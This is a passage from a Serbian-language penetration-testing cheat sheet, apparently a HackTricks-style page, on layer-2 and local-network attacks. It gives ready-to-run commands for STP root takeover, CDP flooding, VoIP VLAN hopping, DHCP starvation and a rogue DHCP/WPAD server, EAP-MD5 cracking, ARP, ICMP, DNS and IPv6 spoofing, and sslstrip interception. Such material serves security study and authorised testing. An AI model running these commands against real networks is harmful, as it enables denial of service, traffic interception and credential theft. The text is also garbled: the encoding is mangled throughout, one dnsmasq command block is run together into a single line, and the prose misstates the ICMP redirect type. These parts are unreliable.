Slanjem velikog broja BPDU TCP (Topology Change Notification) ili Conf (BPDU koji se Å¡alju prilikom kreiranja topologije), preoptereÄ‡uju se prekidaÄi i prestaju pravilno raditi.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Napad**

Kada se TCP paket poÅ¡alje, CAM tabela prekidaÄa Ä‡e biti obrisana za 15 sekundi. Zatim, ako neprekidno Å¡aljete ovu vrstu paketa, CAM tabela Ä‡e se neprekidno restartovati (svakih 15 sekundi) i kada se restartuje, prekidaÄ se ponaÅ¡a kao hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Napad**

NapadaÄ simulira ponaÅ¡anje prekidaÄa kako bi postao STP koren mreÅ¾e. Zatim Ä‡e viÅ¡e podataka prolaziti kroz njega. Ovo je interesantno kada ste povezani sa dva razliÄita prekidaÄa.\
Ovo se postiÅ¾e slanjem BPDUs CONF paketa koji govore da je vrednost **prioriteta** manja od stvarnog prioriteta trenutnog korenskog prekidaÄa.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Ako napadaÄ bude povezan sa 2 prekidaÄa, moÅ¾e postati koren nove mreÅ¾e i sav saobraÄ‡aj izmeÄ‘u tih prekidaÄa Ä‡e prolaziti kroz njega** (izvrÅ¡iÄ‡e se napad MITM).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Napadi na CDP

CISCO Discovery Protocol (CDP) je kljuÄan za komunikaciju izmeÄ‘u CISCO ureÄ‘aja, omoguÄ‡avajuÄ‡i im da **identifikuju jedni druge i dele konfiguracione detalje**.

#### Pasivno prikupljanje podataka <a href="#0e0f" id="0e0f"></a>

CDP je konfigurisan da emituje informacije kroz sve portove, Å¡to moÅ¾e predstavljati sigurnosni rizik. NapadaÄ, nakon povezivanja na switch port, moÅ¾e koristiti mreÅ¾ne snifere poput **Wireshark**, **tcpdump** ili **Yersinia**. Ova akcija moÅ¾e otkriti osetljive podatke o mreÅ¾nom ureÄ‘aju, ukljuÄujuÄ‡i njegov model i verziju Cisco IOS-a koju koristi. NapadaÄ moÅ¾e zatim ciljati specifiÄne ranjivosti u identifikovanoj verziji Cisco IOS-a.

#### Izazivanje preplavljivanja CDP tabele <a href="#0d6a" id="0d6a"></a>

Agresivniji pristup ukljuÄuje pokretanje napada Denial of Service (DoS) preplavljujuÄ‡i memoriju switch-a, pretvarajuÄ‡i se da je legitimni CISCO ureÄ‘aj. U nastavku je prikazana sekvencija komandi za pokretanje takvog napada koristeÄ‡i Yersinia, mreÅ¾ni alat dizajniran za testiranje:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Tokom ovog napada, CPU prekidaÄa i tabela suseda CDP-a su jako optereÄ‡eni, Å¡to Äesto dovodi do onoga Å¡to se naziva **"paraliza mreÅ¾e"** zbog prekomerne potroÅ¡nje resursa.

#### Napad impersonacije CDP-a
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
TakoÄ‘e moÅ¾ete koristiti [**scapy**](https://github.com/secdev/scapy/). Budite sigurni da ga instalirate sa `scapy/contrib` paketom.

### Napadi na VoIP i alat VoIP Hopper

VoIP telefoni, koji su sve viÅ¡e integrisani sa IoT ureÄ‘ajima, nude funkcionalnosti poput otkljuÄavanja vrata ili kontrole termostata putem posebnih telefonskih brojeva. MeÄ‘utim, ova integracija moÅ¾e predstavljati sigurnosne rizike.

Alat [**voiphopper**](http://voiphopper.sourceforge.net) je dizajniran da emulira VoIP telefon u razliÄitim okruÅ¾enjima (Cisco, Avaya, Nortel, Alcatel-Lucent). Otkriva VLAN ID glasovne mreÅ¾e koristeÄ‡i protokole poput CDP, DHCP, LLDP-MED i 802.1Q ARP.

**VoIP Hopper** nudi tri moda za Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): Analizira mreÅ¾ne pakete kako bi identifikovao VLAN ID.
2. **Spoof Mode** (`-c 1`): GeneriÅ¡e prilagoÄ‘ene pakete koji oponaÅ¡aju stvarne VoIP ureÄ‘aje.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Å alje pakete identiÄne onima odreÄ‘enog modela Cisco IP telefona.

Preferirani mod za brzinu je treÄ‡i. Zahteva navoÄ‘enje:

- MreÅ¾ni interfejs napadaÄa (parametar `-i`).
- Naziv emuliranog VoIP ureÄ‘aja (parametar `-E`), u skladu sa Cisco formatom imenovanja (npr. SEP praÄ‡eno MAC adresom).

U korporativnim okruÅ¾enjima, kako bi se oponaÅ¡ao postojeÄ‡i VoIP ureÄ‘aj, moguÄ‡e je:

- Pregledati MAC oznaku na telefonu.
- Prikazati informacije o modelu putem postavki ekrana telefona.
- Povezati VoIP ureÄ‘aj sa laptopom i posmatrati CDP zahteve pomoÄ‡u Wireshark alata.

Primer komande za izvrÅ¡avanje alata u treÄ‡em modu bi bio:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
#### Enumeracija

##### DHCP Discover

Kada se ureÄ‘aj poveÅ¾e sa mreÅ¾om, on Å¡alje DHCP Discover poruku kako bi pronaÅ¡ao DHCP server. Ova poruka sadrÅ¾i MAC adresu ureÄ‘aja i zahteva IP adresu od DHCP servera.

##### DHCP Offer

Kada DHCP server primi DHCP Discover poruku, on Å¡alje DHCP Offer poruku koja sadrÅ¾i IP adresu koju nudi ureÄ‘aju. Ova poruka takoÄ‘e sadrÅ¾i MAC adresu DHCP servera.

##### DHCP Request

Ukoliko ureÄ‘aj prihvati ponuÄ‘enu IP adresu, on Å¡alje DHCP Request poruku DHCP serveru. Ova poruka potvrÄ‘uje da ureÄ‘aj Å¾eli da koristi ponuÄ‘enu IP adresu.

##### DHCP Acknowledgment

Kada DHCP server primi DHCP Request poruku, on Å¡alje DHCP Acknowledgment poruku koja potvrÄ‘uje da je IP adresa dodeljena ureÄ‘aju.

#### DHCP Starvation Attack

Napad DHCP Starvation se sastoji od slanja velikog broja DHCP Discover poruka na mreÅ¾u kako bi se iscrpeli svi dostupni IP adrese iz DHCP pool-a. Ovo moÅ¾e dovesti do toga da ureÄ‘aji ne mogu dobiti validnu IP adresu od DHCP servera.

#### DHCP Spoofing Attack

Napad DHCP Spoofing se sastoji od laÅ¾nog DHCP servera koji Å¡alje DHCP Offer poruke na mreÅ¾u. Ovi laÅ¾ni DHCP serveri mogu dodeliti zlonamernim ureÄ‘ajima laÅ¾ne IP adrese i druge konfiguracijske informacije. Ovo moÅ¾e dovesti do napada na mreÅ¾u, kao Å¡to su Man-in-the-Middle napadi.
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

MoguÄ‡e je izvesti **dva tipa DoS** napada na DHCP servere. Prvi tip podrazumeva **simuliranje dovoljnog broja laÅ¾nih hostova kako bi se iskoristile sve moguÄ‡e IP adrese**.\
Ovaj napad Ä‡e uspeti samo ako moÅ¾ete videti odgovore DHCP servera i zavrÅ¡iti protokol (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Na primer, ovo **nije moguÄ‡e u WiFi mreÅ¾ama**.

Drugi naÄin za izvoÄ‘enje DHCP DoS napada je slanje **DHCP-RELEASE paketa koristeÄ‡i svaku moguÄ‡u IP adresu kao izvorni kod**. Tada Ä‡e server misliti da su svi zavrÅ¡ili sa koriÅ¡Ä‡enjem IP adrese.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Jedan automatizovaniji naÄin za to je koriÅ¡Ä‡enje alata [DHCPing](https://github.com/kamorin/DHCPig)

MoÅ¾ete koristiti pomenute DoS napade da biste naterali klijente da dobiju nove zakupljene adrese unutar okruÅ¾enja i iscrpeli legitimne servere kako bi postali neodzivni. Tako kada legitimni pokuÅ¡aju ponovno povezivanje, **moÅ¾ete posluÅ¾iti zlonamerne vrednosti koje su pomenute u sledeÄ‡em napadu**.

#### Postavljanje zlonamernih vrednosti

LaÅ¾ni DHCP server moÅ¾e biti postavljen koriÅ¡Ä‡enjem DHCP skripte smeÅ¡tene na lokaciji `/usr/share/responder/DHCP.py`. Ovo je korisno za mreÅ¾ne napade, poput presretanja HTTP saobraÄ‡aja i poverljivih podataka, preusmeravanjem saobraÄ‡aja na zlonamerni server. MeÄ‘utim, postavljanje laÅ¾nog gateway-a je manje efikasno jer omoguÄ‡ava samo presretanje izlaznog saobraÄ‡aja sa klijenta, propuÅ¡tajuÄ‡i odgovore od stvarnog gateway-a. Umesto toga, preporuÄuje se postavljanje laÅ¾nog DNS ili WPAD servera za efikasniji napad.

Ispod su opcije komande za konfigurisanje laÅ¾nog DHCP servera:

- **NaÅ¡a IP adresa (Gateway Advertisement)**: Koristite `-i 10.0.0.100` da biste reklamirali IP adresu vaÅ¡eg raÄunara kao gateway.
- **Lokalno DNS ime domena**: Opciono, koristite `-d example.org` da biste postavili lokalno DNS ime domena.
- **Originalni Router/Gateway IP**: Koristite `-r 10.0.0.1` da biste specificirali IP adresu legitimnog rutera ili gateway-a.
- **IP adresa primarnog DNS servera**: Koristite `-p 10.0.0.100` da biste postavili IP adresu laÅ¾nog DNS servera koji kontroliÅ¡ete.
- **IP adresa sekundarnog DNS servera**: Opciono, koristite `-s 10.0.0.1` da biste postavili IP adresu sekundarnog DNS servera.
- **Netmask lokalne mreÅ¾e**: Koristite `-n 255.255.255.0` da biste definisali netmasku za lokalnu mreÅ¾u.
- **Interfejs za DHCP saobraÄ‡aj**: Koristite `-I eth1` da biste osluÅ¡kivali DHCP saobraÄ‡aj na odreÄ‘enom mreÅ¾nom interfejsu.
- **WPAD adresa konfiguracije**: Koristite `-w â€œhttp://10.0.0.100/wpad.datâ€` da biste postavili adresu za WPAD konfiguraciju, pomaÅ¾uÄ‡i u presretanju web saobraÄ‡aja.
- **IP adresa laÅ¾nog podrazumevanog gateway-a**: UkljuÄite `-S` da biste laÅ¾irali IP adresu podrazumevanog gateway-a.
- **Odgovor na sve DHCP zahteve**: UkljuÄite `-R` da biste serveru omoguÄ‡ili odgovor na sve DHCP zahteve, ali budite svesni da je ovo buÄno i moÅ¾e biti otkriveno.

Pravilnim koriÅ¡Ä‡enjem ovih opcija, moÅ¾e se uspostaviti laÅ¾ni DHCP server za efikasno presretanje mreÅ¾nog saobraÄ‡aja.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Napadi na EAP**

Evo nekih taktika napada koje se mogu koristiti protiv implementacija 802.1X:

* Aktivno grubo sile bruÅ¡enje lozinke putem EAP-a
* Napad na RADIUS server sa oÅ¡teÄ‡enim EAP sadrÅ¾ajem _(eksploiti)_
* Snimanje EAP poruka i offline deÅ¡ifrovanje lozinke (EAP-MD5 i PEAP)
* Prisiljavanje EAP-MD5 autentifikacije radi zaobilaÅ¾enja provere TLS sertifikata
* Ubacivanje zlonamernog mreÅ¾nog saobraÄ‡aja prilikom autentifikacije koriÅ¡Ä‡enjem huba ili sliÄnog

Ako je napadaÄ izmeÄ‘u Å¾rtve i servera za autentifikaciju, mogao bi pokuÅ¡ati da degradira (ako je potrebno) autentifikacioni protokol na EAP-MD5 i snimi pokuÅ¡aj autentifikacije. Zatim bi mogao primeniti grubu silu na to koristeÄ‡i:
```
eapmd5pass â€“r pcap.dump â€“w /usr/share/wordlist/sqlmap.txt
```
### Napadi na FHRP (GLBP i HSRP) <a href="#6196" id="6196"></a>

**FHRP** (Protokol za redundanciju prvog koraka) je klasa mreÅ¾nih protokola dizajnirana za **stvaranje sistema za vruÄ‡u redundanciju rutiranja**. Sa FHRP-om, fiziÄki ruteri mogu biti kombinovani u jedan logiÄki ureÄ‘aj, Å¡to poveÄ‡ava otpornost na greÅ¡ke i pomaÅ¾e u raspodeli optereÄ‡enja.

**InÅ¾enjeri kompanije Cisco Systems su razvili dva FHRP protokola, GLBP i HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Postoje tri verzije Routing Information Protocol (RIP): RIP, RIPv2 i RIPng. RIP i RIPv2 Å¡alju datagrame vrÅ¡njacima putem porta 520 koristeÄ‡i UDP, dok RIPng emituje datagrame na UDP portu 521 putem IPv6 multicast-a. RIPv2 podrÅ¾ava MD5 autentifikaciju, dok RIPng ne ukljuÄuje nativnu autentifikaciju, veÄ‡ se oslanja na opcione IPsec AH i ESP zaglavlja unutar IPv6.

- **RIP i RIPv2:** Komunikacija se vrÅ¡i putem UDP datagrama na portu 520.
- **RIPng:** Koristi UDP port 521 za emitovanje datagrama putem IPv6 multicast-a.

Napomena: RIPv2 podrÅ¾ava MD5 autentifikaciju, dok RIPng ne ukljuÄuje nativnu autentifikaciju, veÄ‡ se oslanja na IPsec AH i ESP zaglavlja u IPv6.

### Napadi na EIGRP

**EIGRP (Enhanced Interior Gateway Routing Protocol)** je dinamiÄki rutirajuÄ‡i protokol. **To je protokol vektora udaljenosti.** Ako nema autentifikacije i konfiguracije pasivnih interfejsa, **napadaÄ** moÅ¾e ometati EIGRP rutiranje i izazvati **trovanje tabela rutiranja**. Osim toga, EIGRP mreÅ¾a (tj. autonomni sistem) **je ravna i nema segmentaciju u zone**. Ako **napadaÄ ubaci rutu**, verovatno je da Ä‡e se ova ruta **proÅ¡iriti** kroz autonomni EIGRP sistem.

Da bi se napao EIGRP sistem, potrebno je **uspostaviti susedstvo sa legitimnim EIGRP ruterom**, Å¡to otvara mnoge moguÄ‡nosti, od osnovnog izviÄ‘anja do razliÄitih ubrizgavanja.

[**FRRouting**](https://frrouting.org/) vam omoguÄ‡ava da implementirate **virtuelni ruter koji podrÅ¾ava BGP, OSPF, EIGRP, RIP i druge protokole**. Sve Å¡to trebate da uradite je da ga implementirate na napadaÄevom sistemu i moÅ¾ete se pretvarati da ste legitimni ruter u domenu rutiranja.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) ima moguÄ‡nosti za presretanje emitovanja EIGRP (Enhanced Interior Gateway Routing Protocol). TakoÄ‘e omoguÄ‡ava ubrizgavanje paketa, Å¡to se moÅ¾e koristiti za izmenu rutirajuÄ‡ih konfiguracija.

### OSPF

U Open Shortest Path First (OSPF) protokolu se Äesto koristi **MD5 autentifikacija kako bi se osigurala sigurna komunikacija izmeÄ‘u rutera**. MeÄ‘utim, ova sigurnosna mera moÅ¾e biti kompromitovana koriÅ¡Ä‡enjem alata poput Loki i John the Ripper. Ovi alati su sposobni da uhvate i deÅ¡ifruju MD5 heÅ¡ove, otkrivajuÄ‡i autentifikacioni kljuÄ. Kada se ovaj kljuÄ dobije, moÅ¾e se koristiti za unoÅ¡enje novih rutnih informacija. Za konfigurisanje parametara rute i uspostavljanje kompromitovanog kljuÄa koriste se kartice _Injection_ i _Connection_.

- **Hvatanje i DeÅ¡ifrovanje MD5 HeÅ¡ova:** Za ove svrhe koriste se alati poput Loki i John the Ripper.
- **Konfigurisanje Parametara Rute:** Ovo se radi putem kartice _Injection_.
- **Postavljanje Kompromitovanog KljuÄa:** KljuÄ se konfiguriÅ¡e na kartici _Connection_.

### Ostali GeneriÄki Alati i Izvori

* [**Above**](https://github.com/c4s73r/Above): Alat za skeniranje mreÅ¾nog saobraÄ‡aja i pronalaÅ¾enje ranjivosti
* MoÅ¾ete pronaÄ‡i **viÅ¡e informacija o napadima na mreÅ¾u [ovde](https://github.com/Sab0tag3d/MITM-cheatsheet)**.

## **Spoofing**

NapadaÄ konfiguriÅ¡e sve mreÅ¾ne parametre (GW, IP, DNS) novog Älana mreÅ¾e slanjem laÅ¾nih DHCP odgovora.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Proverite [prethodni odeljak](./#arp-spoofing).

### ICMPRedirect

ICMP preusmeravanje se sastoji od slanja ICMP paketa tipa 1, kod 5, koji ukazuje da je napadaÄ najbolji naÄin da se doÄ‘e do odreÄ‘ene IP adrese. Zatim, kada Å¾rtva Å¾eli da kontaktira tu IP adresu, paket Ä‡e biti poslat preko napadaÄa.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

NapadaÄ Ä‡e reÅ¡iti neke (ili sve) domene koje Å¾rtva traÅ¾i.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**KonfiguriÅ¡ite sopstveni DNS sa dnsmasq**

Da biste konfigurisali sopstveni DNS server koristeÄ‡i dnsmasq, pratite sledeÄ‡e korake:

1. Instalirajte dnsmasq na vaÅ¡em serveru:
```
sudo apt-get install dnsmasq
```

2. Otvorite konfiguracioni fajl dnsmasq:
```
sudo nano /etc/dnsmasq.conf
```

3. KonfiguriÅ¡ite dnsmasq da koristi vaÅ¡u IP adresu kao DNS server:
```
listen-address=your_ip_address
```

4. Dodajte Å¾eljene DNS zapise u konfiguracioni fajl. Na primer:
```
address=/example.com/your_ip_address
```

5. SaÄuvajte i zatvorite fajl.

6. Pokrenite dnsmasq servis:
```
sudo systemctl start dnsmasq
```

Sada ste uspeÅ¡no konfigurisali sopstveni DNS server koristeÄ‡i dnsmasq. MoÅ¾ete koristiti ovaj server za preusmeravanje DNS upita i prilagoÄ‘avanje DNS zapisa prema vaÅ¡im potrebama.
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Lokalni gateway-ji

ÄŒesto postoje viÅ¡e ruta do sistema i mreÅ¾a. Nakon Å¡to napravite listu MAC adresa unutar lokalne mreÅ¾e, koristite _gateway-finder.py_ da biste identifikovali hostove koji podrÅ¾avaju IPv4 prosleÄ‘ivanje.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [LaÅ¾iranje LLMNR, NBT-NS i mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Za lokalno razreÅ¡avanje imena kada DNS pretrage ne uspeju, Microsoft sistemi se oslanjaju na **Link-Local Multicast Name Resolution (LLMNR)** i **NetBIOS Name Service (NBT-NS)**. SliÄno tome, **Apple Bonjour** i **Linux zero-configuration** implementacije koriste **Multicast DNS (mDNS)** za otkrivanje sistema unutar mreÅ¾e. Zbog neautentifikovane prirode ovih protokola i njihovog rada preko UDP, slanjem emitovanih poruka, oni mogu biti iskoriÅ¡Ä‡eni od strane napadaÄa koji Å¾ele da preusmere korisnike na zlonamerne usluge.

MoÅ¾ete se predstavljati kao usluge koje hostovi traÅ¾e koristeÄ‡i Responder za slanje laÅ¾nih odgovora.\
ProÄitajte viÅ¡e informacija o [kako se predstaviti kao usluge pomoÄ‡u Responder-a](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [LaÅ¾iranje WPAD-a](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Preglednici Äesto koriste **Web Proxy Auto-Discovery (WPAD) protokol za automatsko dobijanje podeÅ¡avanja proksi servera**. To ukljuÄuje dobijanje detalja konfiguracije sa servera, posebno putem URL-a kao Å¡to je "http://wpad.example.org/wpad.dat". Otkrivanje ovog servera od strane klijenata moÅ¾e se desiti putem razliÄitih mehanizama:

- Putem **DHCP**-a, gde se otkrivanje olakÅ¡ava koriÅ¡Ä‡enjem posebnog unosa sa kodom 252.
- Preko **DNS**-a, Å¡to ukljuÄuje traÅ¾enje imena hosta oznaÄenog kao _wpad_ unutar lokalne domene.
- Putem **Microsoft LLMNR i NBT-NS**, koji su rezervni mehanizmi koji se koriste u sluÄajevima kada DNS pretrage ne uspeju.

Alat Responder iskoriÅ¡Ä‡ava ovaj protokol tako Å¡to deluje kao **zlonamerni WPAD server**. Koristi DHCP, DNS, LLMNR i NBT-NS da bi prevario klijente da se poveÅ¾u sa njim. Da biste se detaljnije upustili u to kako se usluge mogu predstavljati koristeÄ‡i Responder, [proverite ovo](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [LaÅ¾iranje SSDP i UPnP ureÄ‘aja](spoofing-ssdp-and-upnp-devices.md)

MoÅ¾ete ponuditi razliÄite usluge u mreÅ¾i kako biste **prevarili korisnika** da unese neke **plain-text kredencijale**. **ViÅ¡e informacija o ovom napadu u** [**LaÅ¾iranje SSDP i UPnP ureÄ‘aja**](spoofing-ssdp-and-upnp-devices.md)**.**

### LaÅ¾iranje IPv6 Neighbor

Ovaj napad je veoma sliÄan ARP laÅ¾iranju, ali u svetu IPv6. MoÅ¾ete naterati Å¾rtvu da pomisli da je IPv6 GW ima MAC adresu napadaÄa.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Spoofovanje/Floodovanje OglaÅ¡avanja Rutera

Neke operativne sisteme podrazumevano konfiguriÅ¡u podrazumevanu rutu na osnovu paketa za oglaÅ¡avanje rutera (RA) poslatih u mreÅ¾i. Da biste sebe proglasili kao IPv6 ruter, moÅ¾ete koristiti:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Podrazumevano, neki operativni sistemi pokuÅ¡avaju da konfiguriÅ¡u DNS ÄitajuÄ‡i DHCPv6 paket u mreÅ¾i. Zatim, napadaÄ moÅ¾e poslati DHCPv6 paket da se konfiguriÅ¡e kao DNS. DHCP takoÄ‘e pruÅ¾a IPv6 adresu Å¾rtvi.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (laÅ¾na stranica i ubacivanje JS koda)

## Internet napadi

### sslStrip

Osnovno Å¡to ovaj napad radi je da, u sluÄaju da **korisnik** pokuÅ¡a **pristupiti** HTTP stranici koja se **preusmjerava** na HTTPS verziju, **sslStrip** Ä‡e **odrÅ¾avati** HTTP vezu sa **klijentom** i HTTPS vezu sa **serverom**, tako da Ä‡e moÄ‡i **presresti** vezu u **Äistom tekstu**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
ViÅ¡e informacija [ovde](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ i dns2proxy za zaobilaÅ¾enje HSTS

**Razlika** izmeÄ‘u **sslStrip+ i dns2proxy** u odnosu na **sslStrip** je Å¡to Ä‡e oni **preusmeriti** na primer _**www.facebook.com**_ **na** _**wwww.facebook.com**_ (primetite **dodatno** slovo "**w**") i postaviÄ‡e **IP adresu ovog domena kao IP napadaÄa**. Na ovaj naÄin, **klijent** Ä‡e se **povezati** na _**wwww.facebook.com**_ **(napadaÄa)**, ali iza kulisa **sslstrip+** Ä‡e **odrÅ¾avati** pravu vezu putem https sa **www.facebook.com**.

**Cilj** ove tehnike je da se **izbegne HSTS** jer _**wwww**.facebook.com_ **neÄ‡e** biti saÄuvan u keÅ¡u pregledaÄa, pa Ä‡e pregledaÄ biti prevaren da izvrÅ¡i **autentifikaciju na Facebook-u preko HTTP-a**.\
Napomena: Da bi se izveo ovaj napad, Å¾rtva mora pokuÅ¡ati da pristupi [http://www.faceook.com](http://www.faceook.com) na poÄetku, a ne preko HTTPS-a. Ovo se moÅ¾e postiÄ‡i izmenom linkova unutar HTTP stranice.

ViÅ¡e informacija [ovde](https://www.bettercap.org/legacy/#hsts-bypass), [ovde](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) i [ovde](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip ili sslStrip+ viÅ¡e ne funkcioniÅ¡u. To je zato Å¡to postoje HSTS pravila koja su unapred saÄuvana u pregledaÄima, pa Äak i ako je prvi put da korisnik pristupa "vaÅ¾nom" domenu, pristupiÄ‡e mu preko HTTPS-a. TakoÄ‘e, primetite da unapred saÄuvana pravila i druga generisana pravila mogu koristiti oznaku** [**`includeSubdomains`**](https://hstspreload.appspot.com) **tako da prethodni primer sa** _**wwww.facebook.com**_ **viÅ¡e neÄ‡e funkcionisati jer** _**facebook.com**_ **koristi HSTS sa `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## SluÅ¡anje TCP na portu
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL osluÅ¡kivanje na portu

#### Generisanje kljuÄeva i samopotpisanog sertifikata
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### SluÅ¡anje koriÅ¡Ä‡enjem sertifikata

Kada se vrÅ¡i pasivno prisluÅ¡kivanje mreÅ¾e, moÅ¾e biti korisno koristiti sertifikate kako bi se deÅ¡ifrovala komunikacija izmeÄ‘u klijenta i servera. Ovaj metod se Äesto koristi u situacijama kada se koristi HTTPS protokol za enkripciju podataka.

Da biste koristili ovu tehniku, prvo je potrebno generisati laÅ¾ni sertifikat koji Ä‡e se koristiti za deÅ¡ifrovanje saobraÄ‡aja. Zatim, sertifikat se instalira na ureÄ‘aju koji Ä‡e vrÅ¡iti prisluÅ¡kivanje.

Kada se sertifikat instalira, ureÄ‘aj moÅ¾e deÅ¡ifrovati saobraÄ‡aj izmeÄ‘u klijenta i servera. Ovo omoguÄ‡ava hakeru da prati i analizira komunikaciju, ukljuÄujuÄ‡i i osetljive informacije kao Å¡to su korisniÄka imena, lozinke i druge privatne podatke.

VaÅ¾no je napomenuti da je ova tehnika ilegalna i moÅ¾e biti krÅ¡enje privatnosti. KoriÅ¡Ä‡enje ove tehnike treba da se vrÅ¡i samo u okviru zakonskih i etiÄkih granica, kao deo legitimnog testiranja bezbednosti ili istraÅ¾ivanja.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### SluÅ¡ajte koristeÄ‡i sertifikat i preusmerite na hostove

Da biste izvrÅ¡ili ovu tehniku, prvo morate generisati laÅ¾ni sertifikat koji Ä‡e se koristiti za presretanje saobraÄ‡aja. Zatim, morate konfigurisati svoj sistem da koristi taj sertifikat kako bi mogao da presreÄ‡e SSL/TLS saobraÄ‡aj.

Evo koraka koje treba slediti:

1. GeneriÅ¡ite laÅ¾ni sertifikat koji Ä‡e se koristiti za presretanje saobraÄ‡aja. MoÅ¾ete koristiti alate kao Å¡to su `openssl` ili `mitmproxy` za generisanje sertifikata.

2. KonfiguriÅ¡ite svoj sistem da koristi laÅ¾ni sertifikat. Ovo moÅ¾e zavisiti od operativnog sistema koji koristite. Na primer, na Linuxu moÅ¾ete koristiti alat `sslstrip` za presretanje SSL/TLS saobraÄ‡aja.

